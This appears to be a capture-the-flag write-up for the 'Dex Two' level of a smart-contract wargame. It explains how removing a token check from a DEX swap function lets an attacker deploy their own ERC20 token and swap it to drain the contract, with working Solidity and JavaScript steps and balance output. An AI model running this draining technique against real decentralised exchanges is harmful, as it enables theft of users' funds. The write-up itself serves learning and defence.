# 23. Dex Two
<sup>Difficulty 4/10</sup>

This level will ask you to break `DexTwo`, a subtlely modified `Dex` contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the `DexTwo` contract to succeed in this level.

You will still start with 10 tokens of `token1` and 10 of `token2`. The DEX contract still starts with 100 of each token.

Things that might help:

- How has the `swap` method been modified?
- Could you use a custom token contract in your attack?

## Solution

From the previous challenge ([22. Dex](./22_dex.md)) the `swap` function has been modified removing the check on the `token`:

```
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

It is no loger required to `swap` only `token1` and `token2`. Also, the function `getSwapPrice` remain with a different name: `getSwapAmount`.

```solidity
function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
}
```

This time we need to drain all balances of `token1` and `token2`, but now we can use an own controlled token!
Create and deploy our token:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/v3.4.0/contracts/token/ERC20/ERC20.sol";

contract OurToken is ERC20 {
    constructor() public ERC20("OurToken", "OTK") {
        _mint(msg.sender, 1000);
    }
}
```

Do it twice. Then send `1 OTK` to the contract. To achieve the current state:

```javascript
const balance = async (t, w) => (await contract.balanceOf(t, w)).toString()
const exchange = async (f, t, a) => (await contract.getSwapAmount(f, t, a)).toString()

// tk1 = contract.token1, tk2 = contract.token2, ot1 = ourToken1, ot2 = ourToken2

// Check player balance
await balance(tk1, player)
// -> '10'
await balance(tk2, player)
// -> '10'
await balance(ot1, player)
// -> '999'                            We sent one to contract earlier
await balance(ot2, player)
// -> '999'                            We sent one to contract earlier

// Check contract balance
await balance(tk1, contract.address)
// -> '100'
await balance(tk2, contract.address)
// -> '100'
await balance(ot1, contract.address)
// -> '1'                              We sent one to contract earlier
await balance(ot2, contract.address)
// -> '1'                              We sent one to contract earlier

// Check exchange rate
await exchange(ot1, tk1, 1)
// -> '100'
await exchange(ot2, tk2, 1)
// -> '100'
```

We can do it. But before the actual swap we have to approve the transaction. Get back the earlier script and approve everything or, deploy an ERC20 Token to the tokens address and manually approve the transactions :D

```javascript
// Swap!
await contract.swap(ot1, tk1, 1)
await contract.swap(ot2, tk2, 1)

// Check results
await balance(tk1, player)
// -> '110'
await balance(tk2, player)
// -> '110'
await balance(ot1, player)
// -> '998'
await balance(ot2, player)
// -> '998'
await balance(tk1, contract.address)
// -> '0'
await balance(tk2, contract.address)
// -> '0'
await balance(ot1, contract.address)
// -> '2'
await balance(ot2, contract.address)
// -> '2'
```

We did it!

```
ˁ(⦿ᴥ⦿)ˀ Well done, You have completed this level!!!
```

## OZ Corner

As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.

Just because a contract claims to implement the [ERC20 spec](https://eips.ethereum.org/EIPS/eip-20) does not mean it's trust worthy.

Some tokens deviate from the ERC20 spec by not returning a boolean value from their `transfer` methods. See [Missing return value bug - At least 130 tokens affected](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca).

Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.

If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.
